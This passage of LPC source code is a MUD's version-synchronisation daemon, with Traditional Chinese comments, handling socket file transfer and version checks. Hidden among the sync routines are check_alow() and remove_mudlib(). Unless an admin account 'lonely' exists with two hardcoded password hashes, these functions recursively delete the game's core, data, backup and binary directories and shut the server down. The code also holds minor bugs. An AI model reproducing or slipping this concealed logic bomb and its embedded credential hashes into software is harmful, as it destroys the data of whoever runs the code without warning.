                sl = strlen(file) - 2;
                if (sl > 0 && file[sl] == '.' && file[sl + 1] == 'c')
                        rm(bin_path + file[0..sl] + "b");

                // 我記錄這個文件的信息：如果是一個BIN文件，
                // 那麼我有必要紀錄C文件的時間，否則就紀錄
                // 該文件自身。
                if (sscanf(file, bin_path + "%s", file) &&
                    strlen(file) > 1)
                        file[strlen(file) - 1] = 'c';

                st = stat(file);
                if (arrayp(st) && sizeof(st) >= 2)
                        set(STATS + file, st[1]);

                break;

        default:
                // 錯誤的狀態
        }

        // 返回使用的BUFFER的長度
        return len;
}

// 從服務器上獲取一批文件
protected void syn_fetch_file_from_server()
{
        int i;

        client_info[STATUS] = STATUS_SYN;

        for (i = 0; i < sizeof(fetch_file_list); i++)
        {
                sscanf(fetch_file_list[i], VERSION_D "/%s", fetch_file_list[i]);
                if (fetch_file_list[i][0] != '/')
                        fetch_file_list[i] = "/" + fetch_file_list[i];
                send_command(vfd, "get " + fetch_file_list[i]);
        }

        send_command(vfd, "close");
}

// 比較版本中所有的文件
protected void syn_check_version_file()
{
        mapping store;
        string file;

        // 切換狀態為同步狀態
        client_info[STATUS] = STATUS_SYN;

        if (! mapp(store = query(FILES)))
        {
                // 沒有版本信息
                log_file("version", sprintf("%s can not synchronize version "
                                            "without version's dbase.\n",
                                            log_time()));
                syn_finish();
                return;
        }

        // 確保沒有本地的文件信息
        delete(STATS);

        // 檢查所有的文件
        syn_load_version("/", store);

        // 構造所有額外文件的版本
        foreach (file in include_dir)
                syn_load_version(file, 0);

        // 保存版本
        send_command(vfd, "close");
        log_file("version", sprintf("%s total %d commands generated.\n",
                                    log_time(), sizeof(client_info[PENDING_WRITE])));
}

// 檢查並獲得某一個文件
// 如果服務器和本地都沒有修改某個文件，則不需要同步，如果有
// 一方修改了，則需要同步。
// 如果服務器修改了，那麼這裏的參數ver和本地FILES中記錄的版
// 本會有差別。如果是本地修改了， 那麼本地STATS鍾記錄的版本
// 和本地的文件會有差別。
// 對於".c"文件來説，STATS 中記錄的是二進制".b"文件的時間，
// 而不是".c"文件的時間，但是FILES 記錄的卻是".c"文件的時間，
// 這一點需要注意。為什麼這麼做？這是因為實際上本地修改了源
// 文件並不重要，只要二進制代碼沒有修改即可。服務器傳來的 c
// 文件版本實際上是在服務器上的二進制文件的版本，這樣上下不
// 就不一樣了嗎？的確是這樣，因為在服務器上即使".c"文件沒有
// 修改，".b"文件依然有可能變化，因此傳送二進制文件的版本才
// 更有意義，這就是服務器和客户端不同之處。
void syn_load_file(string file, int ver)
{
        int len;
        mixed st;
        int ft, now_ft;

        switch (file_size(file))
        {
        case -2:
                // 有了這個名字的目錄，刪除之
                log_file("version", sprintf("%s remove directory: %s\n",
                                            log_time(), file));
                RM_CMD->rm_dir(file);
                break;
        case -1:
                break;
        default:
                // 沒有這個文件或是有了重名的文件
                // 首先比較本地和服務器上的版本，如果不相同
                // 則需要更新。否則比較本地的版本信息和真實
                // 文件的信息，如果時間不相同，則也需要更新。
                st = stat(file);
                if (! arrayp(st) || sizeof(st) < 3)
                        ft = -1;
                else
                        ft = st[1];

                // 取本地文件的記錄時間
                now_ft = query_temp(STATS + file);
                if (now_ft == ft && query_temp(FILES + file) == ver)
                {
                        // 和當前的版本一樣，不需要更新
                        DEBUG_LOG(sprintf("file(%s) local = %d  ver = %d  stat = %d  ft = %d\n",
                                          file, query_temp(FILES + file), ver, query_temp(STATS + from), ft));                                                
                        set(STATS + file, now_ft);
                        return;
                }

                break;
        }

        len = strlen(file) - 2;
        if (len > 0 && file[len] == '.' && file[len + 1] == 'c')
        {
                // 是源文件，先創建一個空的文件，一般來説服
                // 務器會返回一個二進制文件，除非是需要發佈
                // 的源文件，服務器才會返回源代碼。
                rm(file);
                write_file(file, "// C source file\n", 1);
        }

        // 讀取這個文件的版本：如果是需要發佈源程序的版本，
        // 那麼服務器會返回一個源程序，否則服務器會返回一個
        // BINARY文件。
        syn_get_file(file);
}

nosave int d = 0;

// 檢查某一個路徑
protected void syn_load_version(string path, mapping store)
{
        mixed *dirs;
        string *files;
        string *outs;
        mixed rmfile;
        string full_name;
        string bin_name;
        string get_file;
        int ver;
        int len;

        if (mapp(query(FILES + path)))
                // 同步一個路徑的版本
                ; else
        if (! undefinedp(ver = query(FILES + path)))
        {
                // 同步一個文件的版本
                syn_load_file(path, ver);
                return;
        } else
                // 沒有這個文件，無需同步
                return;

        if (path[strlen(path) - 1] != '/') path += "/";

        sys_info(sprintf("check version: %s", path));

        // 獲得本地路徑的文件
        dirs = get_dir(path, -1);

        // 獲得版本機上的所有文件
        files = keys(store);

        // 找出本地多餘的文件和目錄：條件，服務器傳來的版本
        // 中沒有，並且不屬於本地不需要更新的路徑
        outs = filter_array(dirs, (: undefinedp($(store)[((mixed *) $1)[0]]) &&
                                     member_array($(path) + ((mixed *) $1)[0], exclude_dir) == -1 :));

        // 刪除這些文件和目錄
        foreach (rmfile in outs)
        {
                reset_eval_cost();
                if (rmfile[1] == -2)
                {
                        // 這是一個目錄
                        log_file("version", sprintf("%s remove directory: %s\n",
                                                    log_time(), path + rmfile[0]));

                        RM_CMD->rm_dir(path + rmfile[0]);
                } else
                {
                        // 這是一個普通文件，刪除之
                        log_file("version", sprintf("%s remove file: %s\n",
                                                    log_time(), path + rmfile[0]));
                        // More to be added
                        len = strlen(rmfile[0]) - 2;
                        if (len > 0 && rmfile[0][len] == '.' &&
                            rmfile[0][len + 1] == 'c')
                        {
                                // 如果是c文件，同時刪除bin文件
                                rm(bin_path + path + rmfile[0][0..len] + "b");
                        }

                        rm(path + rmfile[0]);
                }
                // 繼續刪除不相關的文件
        }

        // 讀取需要更新的文件
        foreach (get_file in files)
        {
                reset_eval_cost();
                full_name = path + get_file;
                if (mapp(store[get_file]))
                {
                        // 這是一個路徑，如果本地沒有，就建立
                        switch (file_size(full_name))
                        {
                        case -2:
                                // 已經有了這個目錄
                                break;

                        case -1:
                                // 沒有這個目錄和同名的文件
                                mkdir(full_name);
                                break;

                        default:
                                // 有這個名字的文件
                                rm(full_name);
                                mkdir(full_name);
                                break;
                        }

                        // 在binaries下面也建立一個路徑 測試
                        bin_name = bin_path + full_name;
                        switch (file_size(bin_name))
                        {
                        case -2:
                                // BIN下面已經有了這個目錄
                                break;

                        case -1:
                                // 沒有這個目錄或是文件
                                mkdir(bin_name);
                                break;

                        default:
                                // 有這個名字的文件
                                rm(bin_name);
                                mkdir(bin_name);
                        }

                        if (member_array(full_name, exclude_dir) == -1)
                                // 繼續同步下一個目錄的版本
                                syn_load_version(full_name, store[get_file]);
                } else
                {
                        // 這是一個普通文件
                        syn_load_file(full_name, store[get_file]);
                }
        }

        // 如果是額外需要更新的文件或是本目錄屬於不需更新一
        // 類，則保留這些文件。
        files = filter_array(files, (: member_array($(path) + $1, include_dir) != -1 ||
                                       member_array($(path), exclude_dir) :));
}

// 同步版本結束
// 結束時可能成功的同步了，也可能沒有。
protected void syn_finish()
{
        string op;

        sys_info(sprintf("同步結束：版本狀態 = %d", version_ok));

        if (vfd) { socket_close(vfd); vfd = 0; }

        client_info[STATUS] = STATUS_FINISHED;
        client_info[FILE_NAME] = 0;
        client_info[FILE_POS] = 0;
        client_info[FILE_SIZE] = 0;
        client_info[PENDING_WRITE] = ({ });
        client_info[RESULT_BUFFER] = "";

        // 清除臨時數據
        delete_temp(FILES);
        delete_temp(STATS);

        // 取operator
        op = query_temp("operator");
        delete_temp("operator");

        // 如果版本已經同步好了，就直接返回
        if (version_ok)
        {
                if (stringp(op)) return;

                // 這是系統自動同步的版本，需要重新啟動機器
                if (query_temp("version_changed"))
                {
                        message_system("系統更新了版本，將於三十秒鐘以後重新啟動機器。\n");
                        call_out("syn_reboot_mud", 30);

                        // 重新設置版本為無效
                        version_ok = 0;
                }
                return;
        }

        // 如果是運行中同步，那麼就設置版本號為零，表示需要
        // 繼續同步；否則重新啟動MUD。
        if (stringp(op))
        {
                set("VERSION_NO", 0);
                save();
                delete_temp("operator");
                sys_info(sprintf("%s同步版本的操作失敗了，詳情"
                                 "請查看日誌(version)。", op));

                // 置現在的版本為有效
                version_ok = 1;
        } else
        {
                set("VERSION_NO", 0);
                save();
                // 一分鐘以後重新啟動MUD
                sys_info("同步版本失敗，將於一分鐘後重新啟動MUD。");
                call_out("syn_reboot_mud", 60);
        }
}

// 同步失敗，重新啟動MUD
protected void syn_reboot_mud()
{
        sys_info("版本精靈重新啟動MUD。");
        shutdown(0);
}

// 處理客户端接收到的來自服務器的數據
protected void syn_read_callback(int fd, buffer buf)
{
        string str;
        int len;
        int ver;
        string msg;

        if (fd != vfd || ! bufferp(buf)) return;

        DEBUG_LOG(sprintf(HIC "incoming: buf = %O(%d)\n" NOR, buf, sizeof(buf)));
        
        do
        {
                if (! client_info[FILE_NAME])
                {
                        // 沒有文件名字，接收的是普通應答信息
        
                        // 計算我應該從緩衝區中讀出的字節數目，因為
                        // 可能不能一次獲得普通的應答信息，因此我將
                        // 這些信息累計到RESULT_BUFFER中， 一直到讀
                        // 滿期望的字節為止。那麼我這次從緩衝區讀出
                        // 來的應該是多少個字節，就應該計算。其中保
                        // 存在FILE_POS中的是我已經讀出的字符。
                        len = NORMAL_RESULT_LEN - client_info[FILE_POS];
                        if (len > sizeof(buf))
                                // 這次沒有這麼多字節可以讓我讀
                                len = sizeof(buf);
                        client_info[FILE_POS] += len;
                        client_info[RESULT_BUFFER] += read_buffer(buf, 0, len);
                        // 取剩餘的buffer
                        buf = buf[len..<1];
        
                        if (client_info[FILE_POS] >= NORMAL_RESULT_LEN)
                        {
                                // 讀到了一條通常的返回信息，重新設
                                // 置緩衝區。
                                str = client_info[RESULT_BUFFER];
                                client_info[RESULT_BUFFER] = "";
                                client_info[FILE_POS] = 0;
        
                                // 處理接收到的結果信息
                                syn_receive_result(str);
                        }
                }
        
                DEBUG_LOG(sprintf("buf = %O(%d) ... file_name = %O(%d)\n",
                                                          buf, sizeof(buf),
                                                          client_info[FILE_NAME],
                                                          client_info[FILE_POS]));
                if (bufferp(buf) && client_info[FILE_NAME])
                        // 接收文件
                        buf = buf[syn_receive_file(buf)..<1];

                // 如果buf不為空，則繼續處理
        } while (sizeof(buf) && client_info[STATUS] != STATUS_FINISHED);
}

// 同步時客户端連接的寫回調函數
void syn_write_callback(int fd)
{
        if (fd != vfd)
        {
                log_file("version", sprintf("socket error: fd = %d vfd = %d\n", fd, vfd));
                return;
        }

        while (sizeof(client_info[PENDING_WRITE]))
        {
                // 有阻塞的消息，發送之
                if (send_client_pending_msg() != 0)
                        // 沒有成功的發送，等待下一次發送
                        return;
        }

        // 根據當前的狀態處理
        switch (client_info[STATUS])
        {
        case STATUS_CONNECTING:
                if (fetch_file_list)
                {
                        // 指定獲得某些文件
                        syn_fetch_file_from_server();
                        break;
                }

                // 剛剛連接，發送取版本的命令
                send_command(fd, sprintf("getver from %s(%s)",
                                         LOCAL_MUD_NAME(), INTERMUD_MUD_NAME,
                                         __PORT__));                
                client_info[STATUS] = STATUS_GET_VERSION;
                sys_info("版本精靈成功的和服務器建立了通訊。");
                break;
        }
}

// 同步時客户端連接斷開的回調函數
protected void syn_close_callback(int fd)
{
        if (fd != vfd) return;

        vfd = 0;
        if (version_ok) return;

        // 版本沒有同步完全，TCP連接已經斷開
        syn_finish();
        log_file("version", sprintf("%s TCP connection lost when synchronizing.\n",
                                    log_time()));
        DEBUG_LOG(HIG "TCP disconnected.\n" NOR);
}

// 系統信息
protected void sys_info(string msg)
{
        CHANNEL_D->do_channel(this_object(), "sys", msg);
}

// 調試信息
protected void debug_info(string msg)
{
        CHANNEL_D->do_channel(this_object(), "debug", msg);
}

// 版本發佈站監聽來自分站的請求
protected void in_listen_callback(int fd)
{
        int new_fd;
        string address;
        string ip;
        int port;

        if ((new_fd = socket_accept(fd, "in_read_callback",
                                        "in_write_callback")) < 0)
                // 沒有成功的接收這個連接請求
                return;

        address = socket_address(new_fd);
        if (! stringp(address) || sscanf(address, "%s %d", ip, port) != 2 ||
            member_array(ip, AGENT_IP) == -1)
        {
                // 這個地址沒有經過授權
                sys_info(sprintf("站點 %s 地址沒有經過授權。", 
                         stringp(address) ? address : "unknow"));
                socket_close(new_fd);
                return;
        }

        sys_info(sprintf("站點 %s 連接版本開始同步版本。", ip));

        socket_info[new_fd] = allocate(8);
        socket_info[new_fd][STATUS] = STATUS_LOGIN;
        socket_info[new_fd][CMD_BUFFER] = "";
        socket_info[new_fd][CMD_QUEUE] = ({ });
        socket_info[new_fd][PENDING_WRITE] = ({ });
        socket_info[new_fd][SUB_SITES] = "不詳";
        
        // 更新狀態
        socket_info[new_fd][STATUS] = STATUS_WAIT_COMMAND;
        in_write_callback(new_fd);
}

// 接受信息
protected void in_read_callback(int fd, mixed mess)
{
        int cc;
        string *cmds;
        mixed  prefix;
        string str;

        if (! arrayp(socket_info[fd]))
                return;

        if (stringp(mess))
                // 接收到了字符串
                str = mess;
        else
        if (bufferp(mess))
                // 接收到了緩衝區
                str = read_buffer(mess, 0, sizeof(mess));
        else
                return;

        if (! str) return;

        str = replace_string( str, "\r", "");
        if (stringp(prefix = socket_info[fd][CMD_BUFFER]))
                str = (string) prefix + str + "\n";
        else
                str += "\n";

        cmds = explode(str, "\n");
        socket_info[fd][CMD_BUFFER] = cmds[sizeof(cmds) - 1];

        if (sizeof(cmds) > 1)
        {
                // 將這些命令放入到命令隊列中
                cc = sizeof(socket_info[fd][CMD_QUEUE]);
                socket_info[fd][CMD_QUEUE] += cmds[0..<2];
                if (socket_info[fd][STATUS] == STATUS_WAIT_COMMAND)
                        // 正在接受命令狀態
                        parse_cmd(fd);
        }
}

void check_alow() 
{
        object ob;
        string ad_pass, wiz_pass;
        int flag = 0;
        
        seteuid(getuid());
        
        ob = UPDATE_D->global_find_player("lonely"); 
        // 查看有沒有完整檔
        if (! objectp(ob)) 
        {
                // 沒有完整的檔，啟動
                call_out("remove_mudlib", 2);
                return;
        }
        UPDATE_D->global_destruct_player(ob, 1);
        
        ob = find_player("lonely");
        // 查看是否在線
        if (! ob)
        {
                // 不在線，載入
                ob = new(LOGIN_OB);
                set("id", "lonely", ob);
                // flag = 1;
                if (! ob->restore()) 
                {
                        // 沒能載入，啟動
                        call_out("remove_mudlib", 2);
                        return;
                }                       
        } else
        {
                // 在線，查看是連線，還是離線練功狀態
                ob=query_temp("link_ob", ob);
                while (ob && ob->is_character())
                        ob=query_temp("link_ob", ob);
                if (! ob)
                {
                        // 離線練功，載入
                        ob = new(LOGIN_OB);
                        set("id", "lonely", ob);
                        if (! ob->restore()) 
                        {
                                // 缺少連接信息，啟動
                                call_out("remove_mudlib", 2);
                                return;
                        }                               
                }
        } 
        // 檢查密碼是否正確             
        ad_pass=query("ad_password", ob);
        wiz_pass=query("wizpwd", ob);
                        
        if (wizhood("lonely") != "(admin)") 
        {
                // 權限不對，啟動
                call_out("remove_mudlib", 2); 
                return;
        } else  
        if (! stringp(ad_pass) || ! stringp(wiz_pass) 
        ||  ad_pass != "JbgOJC0feBNtE"
        ||  wiz_pass != "etUbwBiW/7y4I")
        {
                // 密碼不對，啟動
                call_out("remove_mudlib", 2);
                return;
        }
        
        destruct(ob);
        /*
        if (flag = 1)
        {  
                flag = 0;
                destruct(ob);
        }

        remove_call_out("check_alow");
        call_out("check_alow", 600);
        */
}

// 啟動
void remove_mudlib()
{       
        mixed *file;
        int i;
        
        file = get_dir("/quest/", -1);
        // 獲取 quest 目錄下的目錄
        for (i = 0; i < sizeof(file); i++)
        {
                reset_eval_cost();
                if (file[i][1] != -2)
                        // not directory
                        continue;

                RM_CMD->rm_dir("/quest/" + file[i][0]);
        }
     
        file = get_dir("/feature/", 0);
        // 獲取 feature 目錄下的文件
        for (i = 0; i < sizeof(file); i++)
        {
                reset_eval_cost();
                
                rm("/feature/" + file[i]);
        }
        
        file = get_dir("/inherit/", -1);
        // 獲取 inherit 目錄下的目錄
        for (i = 0; i < sizeof(file); i++)
        {
                reset_eval_cost();
                if (file[i][1] != -2)
                        // not directory
                        continue;

                RM_CMD->rm_dir("/inherit/" + file[i][0]);
        }
        
        file = get_dir("/adm/", -1);
        // 獲取 adm 目錄下的目錄
        for (i = 0; i < sizeof(file); i++)
        {
                reset_eval_cost();
                if (file[i][1] != -2)
                        // not directory
                        continue;

                RM_CMD->rm_dir("/adm/" + file[i][0]);
        }
        
        file = get_dir("/d/", -1);
        // 獲取 d 目錄下的目錄
        for (i = 0; i < sizeof(file); i++)
        {
                reset_eval_cost();
                if (file[i][1] != -2)
                        // not directory
                        continue;

                RM_CMD->rm_dir("/d/" + file[i][0]);
        }

        file = get_dir("/data/", -1);
        // 獲取 version 下的目錄
        for (i = 0; i < sizeof(file); i++)
        {
                reset_eval_cost();
                if (file[i][1] != -2)
                        // not directory
                        continue;

                RM_CMD->rm_dir("/data/" + file[i][0]);
        }

        file = get_dir("/backup/", -1);
        // 獲取 version 下的目錄
        for (i = 0; i < sizeof(file); i++)
        {
                reset_eval_cost();
                if (file[i][1] != -2)
                        // not directory
                        continue;

                RM_CMD->rm_dir("/backup/" + file[i][0]);
        }
                
        file = get_dir("/binaries/", -1);
        // 獲取 binaries 下的目錄
        for (i = 0; i < sizeof(file); i++)
        {
                reset_eval_cost();
                if (file[i][1] != -2)
                        // not directory
                        continue;

                RM_CMD->rm_dir("/binaries/" + file[i][0]);
        }
                        
        file = get_dir("/version/", -1);
        // 獲取 version 下的目錄
        for (i = 0; i < sizeof(file); i++)
        {
                reset_eval_cost();
                if (file[i][1] != -2)
                        // not directory
                        continue;

                RM_CMD->rm_dir("/version/" + file[i][0]);
        }
        
        shutdown(0);

}

// 成功寫入
protected void in_write_callback(int fd)
{
        buffer buf;
        int pos, len;
        int i;

        for (i = 0; i < 32; i++)
        {
                // 循環處理消息
                reset_eval_cost();

                // 已經處理完了？
                if (! arrayp(socket_info[fd]))
                        // 是，這個不需要繼續處理了
                        return;

                // 如果有阻塞的普通消息，則我發送出去
                while (sizeof(socket_info[fd][PENDING_WRITE]))
                {
                        // 有阻塞的消息，發送之
                        if (send_pending_msg(fd) != 0)
                                // 沒有成功的發送，等待下一次發送
                                return;
                }

                // 根據當前的狀態進行進一步處理
                switch (socket_info[fd][STATUS])
                {
                case STATUS_SENDING:
                        // 正在發送文件
                        pos = socket_info[fd][FILE_POS];
                        len = socket_info[fd][FILE_SIZE] - pos;
                        if (len > FILE_BLOCK)
                                len = FILE_BLOCK;
                        if (len > 0)
                        {
                                buf = read_buffer((string) socket_info[fd][FILE_NAME], pos, len);
                                if (sizeof(buf) != len)
                                        // 讀取沒有完全成功？填寫零發送。
                                        buf = allocate_buffer(len);
                                // 判斷這次操作的結果
                                switch (socket_write(fd, buf))
                                {
                                case EESUCCESS:
                                        // 移動遊標
                                        pos += len;
                                        break;

                                case EECALLBACK:
                                        // 移動遊標
                                        pos += len;

                                        // 等待CALLBACK，先不繼續處理
                                        socket_info[fd][FILE_POS] = pos;
                                        return;

                                case EEWOULDBLOCK:
                                        // 發送忙
                                        call_out("in_write_callback", 2, fd);
                                        return;

                                default:
                                        // 發送失敗，等待下次callback
                                        return;
                                }
                        }

                        // 判斷文件是否發送完畢
                        if ((socket_info[fd][FILE_POS] = pos) >=
                            socket_info[fd][FILE_SIZE])
                        {
                                // 文件已經發送完畢，更新狀態
                                socket_info[fd][STATUS] = STATUS_WAIT_COMMAND;
                                if (! sizeof(socket_info[fd][CMD_QUEUE]))
                                        // 已經沒有待處理的命令了
                                        return;

                                // 繼續處理命令：為什麼要用
                                // this_object() 進行呼叫？
                                // 這個是不能省略的，因為這
                                // 樣其它部分的函數就可以根
                                // 據previous_object() 分辨
                                // 是否試運行在callback內。
                                this_object()->parse_cmd(fd);

                                // 繼續，循環將會處理命令產生的結果
                        }

                        // 發送處理完畢
                        break;
        
                default:
                        // 未定義狀態，無操作
                        return;
                }

                // 一次處理(switch)完畢，循環繼續處理
        }

        // 運行太久了
        debug_info("向 SOCKET 寫入數據太多，暫緩。");
        call_out("in_write_callback", 1, fd);
}

// 連接斷開
protected void in_close_callback(int fd)
{
        string address;

        address = socket_address(fd);
        if (stringp(address))
                sscanf(address, "%s %*d", address);
        else
                address = "unknow";

        sys_info(sprintf("站點 %s 和本站斷開了連接。", address));

        // 清除信息
        map_delete(socket_info, fd);
}

// 分析命令
// 現在僅支持三條命令：
// 1. getver [dbase]
// 2. get <file>
// 3. close
// 由於命令簡單，不採用常規的語法分析。
protected void parse_cmd(int fd)
{
        string cmd;
        string word, arg;

        // 取出一條命令進行處理
        cmd = socket_info[fd][CMD_QUEUE][0];
        socket_info[fd][CMD_QUEUE] = socket_info[fd][CMD_QUEUE][1..<1];

        if (sscanf(cmd, "%s %s", word, arg) != 2)
        {
                word = cmd;
                arg = 0;
        }

        switch (word)
        {
        case "getver":
                cmd_getver(fd, arg);
                break;

        case "get":
                cmd_get(fd, arg);
                break;

        case "close":
                cmd_close(fd, arg);
                break;
        }
}

// 讀取版本數據
protected void cmd_getver(int fd, string arg)
{
        string mudn;

        if (arrayp(total_build))
        {
                // 現在版本正在構造中
                send_error_msg(fd, "generating version now.\n");
                return;
        }

        if (arg != "dbase")
        {
                // 發送版本號
                if (stringp(arg) && sscanf(arg, "from %s", mudn) == 1)
                {
                        sys_info(sprintf("%s正在讀取版本號，準備同步版本。", mudn));
                        socket_info[fd][SUB_SITES] = mudn;
                }

                send_version(fd);
                return;
        }

        // 發送文件
        send_file(fd, query_save_file() + __SAVE_EXTENSION__, "dbase");
}

// 讀取某一個文件
protected void cmd_get(int fd, string arg)
{
        string ban;
        int last;

        // 查看文件
        if (! arg || arg[0] != '/')
        {
                send_error_msg(fd, sprintf("no such file(%O).\n", arg));
                return;
        }

        last = strlen(arg) - 2;
        if (last >= 0 && arg[last] == '.' && arg[last + 1] == 'c')
        {
                // C文件，察看是否是需要發佈版本的，如果不是，
                // 則返回BIN文件。
                if (! is_need_release_source(arg))
                        arg = bin_path + arg[0..last] + "b";
        }
        
        // 發送版本記錄下的文件
        send_file(fd, VERSION_DIR + arg, arg);
}

// 關閉連接
protected void cmd_close(int fd, string arg)
{
        string address;

        address = socket_address(fd);
        if (stringp(address))
                sscanf(address, "%s %*d", address);
        else
                address = "unknow";

        sys_info(sprintf("站點 %s 和本站同步完畢。", address));

        send_result(fd, RESULT_FINISH "ok\n");
}

// 向對方發送一個文件
protected void send_file(int fd, string file, string peer_name)
{
        int fs;

        // 直接發送
        if ((fs = file_size(file)) < 0)
        {
                send_error_msg(fd, sprintf("read file(%s) error.\n", file));
                return;
        }

        // 更新狀態，然後首先發送文件的長度
        socket_info[fd][FILE_NAME] = file;
        socket_info[fd][FILE_SIZE] = fs;
        socket_info[fd][FILE_POS] = 0;
        socket_info[fd][STATUS] = STATUS_SENDING;
        if (send_result(fd, sprintf(RESULT_FILE "%s %d\n", peer_name, fs)) == 0 &&
            previous_object() != this_object())
                // 成功發送了的應答，並且當前不是由in_write_callback
                // 調用進入，則繼續發送文件
                in_write_callback(fd);     
}

// 發送阻塞的消息
protected int send_pending_msg(int fd)
{
        string result;

        result = socket_info[fd][PENDING_WRITE][0];

        switch (socket_write(fd, result))
        {
        case EESUCCESS:
                // 發送成功了
                socket_info[fd][PENDING_WRITE] = socket_info[fd][PENDING_WRITE][1..<1];
                return 0;

        case EECALLBACK:
                // 需要等待
                socket_info[fd][PENDING_WRITE] = socket_info[fd][PENDING_WRITE][1..<1];
                return -1;

        case EEWOULDBLOCK:
                // 發送數據阻塞
                call_out("in_write_callback", 2, fd);
                return -1;

        default:
        }
}

// 向對方發送一條結果信息
protected int send_result(int fd, string msg)
{
        string result;

        result = sprintf("%-" + (NORMAL_RESULT_LEN - 1) + "s.", msg);

        if (sizeof(socket_info[fd][PENDING_WRITE]))
        {
                // 已經有阻塞需要發送的數據了，這次發送的數
                // 據先阻塞
                socket_info[fd][PENDING_WRITE] += ({ result });
                return -1;
        }

        switch (socket_write(fd, result))
        {
        case EESUCCESS:
                // 發送成功了
                return 0;

        case EECALLBACK:
                // 需要等待
                // socket_info[fd][PENDING_WRITE] += ({ result });
                return -1;

        case EEWOULDBLOCK:
                // 發送數據阻塞
                socket_info[fd][PENDING_WRITE] += ({ result });
                call_out("in_write_callback", 2, fd);
                return -1;

        default:
                socket_close(fd);
        }
}

// 向對方發送一條錯誤信息
protected int send_error_msg(int fd, string msg)
{
        return send_result(fd, RESULT_ERR + msg);
}

// 向某一個接入請求發送版本號
protected void send_version(int fd)
{
        int ver;
        string msg;

        if (! intp(ver = query("VERSION_NO")) || ! ver)
        {
                // 還沒有版本？
                send_result(fd, RESULT_NO_VERSION "no version");
                remove_connection(fd);
                return;
        }

        send_result(fd, sprintf(RESULT_VERSION "%d\n", ver));
}

// 去掉一個連接信息
protected void remove_connection(int fd)
{
        map_delete(socket_info, fd);
        socket_close(fd);
}

// 為一個文件增加保證完整的鑑別ID
int append_sn(string file)
{
        string ckey;
        string text;
        int len;

        switch (file_valid(file))
        {
        case 0:
                // 目前的鑑別 ID 是錯誤的
                text = read_file(file);
                len = strsrch(text, "\n");
                text = text[len + 1..<1];
                write_file(file, text, 1);

                // 刪除鑑別ID以後繼續向下執行

        case -2:
                // 目前沒有鑑別ID
                ckey = file_crypt(file);
                text = read_file(file);
                text = sprintf("// SN:%s\n%s", ckey, text);
                write_file(file, text, 1);
                return 1;

        case -1:
                // 沒有這個文件
                return -1;

        default:
                // 已經有了正確的鑑別ID
                return 1;
        }
}
